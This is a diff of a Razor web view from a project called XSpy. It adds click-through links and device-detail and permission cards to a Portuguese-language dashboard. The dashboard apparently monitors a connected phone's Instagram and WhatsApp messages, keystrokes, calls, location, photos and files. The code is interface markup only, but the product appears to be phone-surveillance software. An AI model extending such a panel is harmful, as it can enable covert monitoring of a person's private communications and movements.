@@ -1,6 +1,6 @@
 ﻿@{
     ViewData["Title"] = "Aparelhos conectados";
-    ViewData["PageScript"] = "/js/app/device/list.js";
+    ViewData["PageScript"] = "/js/app/device/phone.js";
 
 }
 @model XSpy.Shared.Models.Views.DeviceMenuViewModel
@@ -11,22 +11,21 @@
 <section class="content">
     <div class="container-fluid">
         <div class="row">
-            <div class="col-6 col-sm-6 col-md-3">
+            <div class="col-6 col-sm-6 col-md-3" onclick="window.location.href='appMessages/Instagram'">
                 <div class="info-box">
-                    <span class="info-box-icon bg-info elevation-1"><i class="fas fa-battery-three-quarters"></i></span>
+                    <span class="info-box-icon bg-info elevation-1"><i class="fab fa-instagram"></i></span>
 
                     <div class="info-box-content">
-                        <span class="info-box-text">Bateria</span>
+                        <span class="info-box-text">Instagram</span>
                         <span class="info-box-number">
-                            @Model.BatteryLevel
-                            <small>%</small>
+                            @Model.Instagram
                         </span>
                     </div>
                     <!-- /.info-box-content -->
                 </div>
                 <!-- /.info-box -->
             </div>
-            <div class="col-6 col-sm-6 col-md-3">
+            <div class="col-6 col-sm-6 col-md-3" onclick="window.location.href='words'">
                 <div class="info-box">
                     <span class="info-box-icon bg-primary elevation-1"><i class="fas fa-keyboard"></i></span>
 
@@ -42,7 +41,7 @@
                 <!-- /.info-box -->
             </div>
 
-            <div class="col-6 col-sm-6 col-md-3">
+            <div class="col-6 col-sm-6 col-md-3" onclick="window.location.href='messages'">
                 <div class="info-box">
                     <span class="info-box-icon bg-warning elevation-1" style="color: white !important"><i class="fas fa-envelope"></i></span>
 
@@ -56,7 +55,7 @@
             </div>
 
 
-            <div class="col-6 col-sm-6 col-md-3">
+            <div class="col-6 col-sm-6 col-md-3" onclick="window.location.href='phone'">
                 <div class="info-box">
                     <span class="info-box-icon bg-danger elevation-1"><i class="far fa-address-book"></i></span>
 
@@ -68,7 +67,7 @@
                     </div>
                 </div>
             </div>
-            <div class="col-6 col-sm-6 col-md-3">
+            <div class="col-6 col-sm-6 col-md-3" onclick="window.location.href='phone'">
                 <div class="info-box">
                     <span class="info-box-icon bg-primary elevation-1"><i class="fas fa-phone"></i></span>
 
@@ -81,7 +80,7 @@
                 </div>
             </div>
 
-            <div class="col-6 col-sm-6 col-md-3">
+            <div class="col-6 col-sm-6 col-md-3" onclick="window.location.href='tracking'">
                 <div class="info-box">
                     <span class="info-box-icon bg-danger elevation-1"><i class="fas fa-map-marked-alt"></i></span>
 
@@ -93,7 +92,7 @@
                     </div>
                 </div>
             </div>
-            <div class="col-6 col-sm-6 col-md-3">
+            <div class="col-6 col-sm-6 col-md-3" onclick="window.location.href='details'">
                 <div class="info-box">
                     <span class="info-box-icon bg-secondary elevation-1"><i class="fas fa-wifi"></i></span>
 
@@ -104,8 +103,8 @@
                         </span>
                     </div>
                 </div>
-            </div>
-            <div class="col-6 col-sm-6 col-md-3">
+            </div>            <div class="col-6 col-sm-6 col-md-3" onclick="window.location.href='appMessages/WhatsApp'">
+
                 <div class="info-box">
                     <span class="info-box-icon bg-success elevation-1"><i class="fab fa-whatsapp"></i></span>
 
@@ -117,7 +116,7 @@
                     </div>
                 </div>
             </div>
-            <div class="col-6 col-sm-6 col-md-3">
+            <div class="col-6 col-sm-6 col-md-3" onclick="window.location.href='photos'">
                 <div class="info-box">
                     <span class="info-box-icon bg-secondary elevation-1"><i class="fas fa-images"></i></span>
 
@@ -129,7 +128,7 @@
                     </div>
                 </div>
             </div>
-            <div class="col-6 col-sm-6 col-md-3">
+            <div class="col-6 col-sm-6 col-md-3" onclick="window.location.href='files'">
                 <div class="info-box">
                     <span class="info-box-icon bg-warning elevation-1" style="color:white !important"><i class="fas fa-folder"></i></span>
 
@@ -141,7 +140,7 @@
                     </div>
                 </div>
             </div>
-            <div class="col-6 col-sm-6 col-md-3">
+            <div class="col-6 col-sm-6 col-md-3" onclick="window.location.href='downloads'">
                 <div class="info-box">
                     <span class="info-box-icon bg-primary elevation-1" style="color:white !important"><i class="fas fa-download"></i></span>
 
@@ -153,7 +152,7 @@
                     </div>
                 </div>
             </div>
-            <div class="col-6 col-sm-6 col-md-3">
+            <div class="col-6 col-sm-6 col-md-3" onclick="window.location.href='notifications'">
                 <div class="info-box">
                     <span class="info-box-icon bg-info elevation-1" style="color:white !important"><i class="far fa-bell"></i></span>
 
@@ -169,6 +168,74 @@
 
         </div>
         <!-- /.row -->
+        <div class="row">
+            <div class="col-md-4 col-12">
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">Detalhes do dispositivo</h3>
+                    </div>
+                    <!-- /.card-header -->
+                    <div class="card-body">
+                        Modelo: @Model.Device.Model <br />
+                        Estado: @if (Model.Device.IsOnline)
+                        {
+                            <span>Online</span>
+                        }
+                        else
+                        {
+                            <span>Offline</span>
+                        }<br />
+                        Marca: @Model.Device.Manufacturer <br />
+                        Versão do sistema: @Model.Device.SystemVersion <br />
+                        Criado em: @Model.Device.AddedAt <br />
+                        Última atualização: @Model.Device.UpdatedAt
+                    </div>
+                    <!-- /.card-body -->
+                </div>
+                <!-- /.card -->
+                <!-- /.card -->
+            </div>
+            <div class="col-md-8 col-12">
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">Permissões do aplicativo</h3>
+                    </div>
+                    <!-- /.card-header -->
+                    <div class="card-body">
+                        <table id="dataTable" class="table table-hover table-text-center" style="width: 100%">
+                            <thead>
+                                <tr>
+                                    <th>Nome</th>
+                                    <th>Situação</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                @foreach (var perm in Model.Device.Permissions)
+                                {
+                                    <tr>
+                                        <td>@perm.Key</td>
+                                        @if (perm.IsAllowed)
+                                        {
+                                            <td>Permitido</td>
+                                        }
+                                        else
+                                        {
+                                            <td>Não Permitido</td>
+                                        }
+                                    </tr>
+                                }
+                            </tbody>
+                        </table>
+                    </div>
+                    <!-- /.card-body -->
+                </div>
+                <!-- /.card -->
+                <!-- /.card -->
+            </div>
+            <!-- /.col -->
+        </div>
+
+
     </div>
     <!-- /.container-fluid -->
 </section>
